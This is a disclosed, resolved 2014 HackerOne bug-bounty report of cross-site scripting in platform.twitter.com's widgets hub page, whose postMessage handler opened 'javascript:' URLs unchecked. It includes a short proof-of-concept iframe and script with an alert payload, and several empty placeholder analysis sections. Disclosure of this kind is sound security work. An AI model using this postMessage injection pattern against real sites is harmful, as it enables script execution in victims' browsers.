---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '29328'
original_report_id: '29328'
title: XSS platform.twitter.com
weakness: Cross-site Scripting (XSS) - Generic
team_handle: x
created_at: '2014-09-28T18:18:12.595Z'
disclosed_at: '2014-11-17T14:30:52.825Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 2
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# XSS platform.twitter.com

## Metadata

- HackerOne Report ID: 29328
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: x
- Disclosed At: 2014-11-17T14:30:52.825Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Since you have fixed a few problems with the FlashTransport on platform.twitter.com already,
I though I would also take a look at the JavaScript around it.

_Problem URL:_
https://platform.twitter.com/widgets/hub.html

__Description:__
The mentioned page opens URLs send to it via postMessage or FlashTransport without checking for an 'javascript:'-prefix, resulting in XSS on platform.twitter.com. Since the URL gets open in a popup, popups need to be allowed or the opening a result of user interaction. 

__PoC:__

    <iframe src="https://platform.twitter.com/widgets/hub.html" id="iframe"></iframe>

    <script>
      var win = document.getElementById("iframe").contentWindow

      function fire() {
        win.postMessage(
          '{"id": 12, "method": "openIntent", "params":["javascript:alert(document.domain)"]}',
          "https://platform.twitter.com/" 
        )
      }

      function listener(e){
        console.log(e.data);
        if(e.data == '__ready__')
          fire();
      }

      if (window.addEventListener){
        addEventListener("message", listener, false)
      } else {
        attachEvent("onmessage", listener)
      }
    </script>


Tested in:
 Win 8.1 | Google Chrome | Version 39.0.2166.2 dev-m (64-bit)

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
